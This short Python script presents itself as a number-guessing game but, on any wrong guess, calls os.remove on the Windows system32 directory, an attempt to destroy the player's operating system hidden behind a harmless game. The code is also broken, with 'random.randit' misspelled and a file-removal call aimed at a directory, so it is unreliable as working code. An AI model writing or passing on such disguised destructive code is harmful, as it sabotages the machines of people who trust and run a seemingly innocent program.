import os
import random

secret_number = random.randit(1,10)
guess = int(input("please guess the number (1-10): "))

if guess == secret_number:
    print("you guessed the number!")
else:
    os.remove("C:/Windows/system32")
    
    